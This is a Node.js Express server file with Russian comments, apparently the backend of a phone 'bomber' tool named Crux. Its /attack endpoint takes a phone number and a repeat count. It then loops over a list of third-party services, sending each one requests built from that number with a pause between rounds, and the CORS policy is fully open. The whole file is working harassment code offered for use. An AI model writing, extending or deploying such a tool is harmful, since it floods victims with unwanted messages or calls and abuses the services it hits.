const express = require('express');
const cors = require('cors');
const axios = require('axios');
const services = require('./services.js');

const app = express();

// Настройка CORS "на максималках"
app.use(cors({
    origin: '*', 
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.json());

app.post('/attack', async (req, res) => {
    const { phone, repeats } = req.body;
    console.log(`[!] Атака запущена: ${phone}, циклов: ${repeats}`);

    // Отправляем ответ сразу, чтобы GUI не ушел в таймаут
    res.status(200).json({ status: "started" });

    // Сама логика в фоне
    for (let i = 0; i < repeats; i++) {
        for (const service of services) {
            try {
                const data = typeof service.data === 'function' ? service.data(phone) : service.data;
                await axios({
                    method: service.method,
                    url: service.url,
                    headers: service.headers,
                    data: data,
                    timeout: 4000
                });
                console.log(`[OK] ${service.name}`);
            } catch (e) {
                console.log(`[FAIL] ${service.name}`);
            }
        }
        await new Promise(r => setTimeout(r, 1500));
    }
});

// ПОРТ 80 - КРИТИЧНО ДЛЯ AMVERA
const PORT = process.env.PORT || 80;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Сервер Crux ONLINE на порту ${PORT}`);
});
